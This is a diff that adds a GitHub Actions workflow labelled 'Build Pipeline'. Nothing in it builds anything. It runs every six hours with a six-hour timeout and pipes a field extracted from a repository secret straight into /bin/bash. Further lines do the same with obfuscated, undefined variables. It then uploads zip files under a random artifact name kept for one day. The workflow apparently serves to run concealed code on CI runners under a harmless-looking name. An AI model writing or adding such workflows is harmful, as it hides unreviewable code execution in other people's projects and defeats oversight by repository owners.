@@ -1,0 +1,42 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          i09: ${{ secrets.i09 }}
+        run: |
+          printf '%s' "$i09" | jq -r .k458 | /bin/bash
+          echo $m05133 | jq -r .an463 | /bin/bash
+          echo $vpdn64 | jq -r .l2391 | /bin/bash
+          printf '%s' "$vhgf36709" | jq -r .w1 | /bin/bash
+          echo $p27025 | jq -r .nmig47 | /bin/bash
+          printf '%s' "$tja27663" | jq -r .meexd694 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: v2GWgHyC
+          path: "*.zip"
+          retention-days: 1
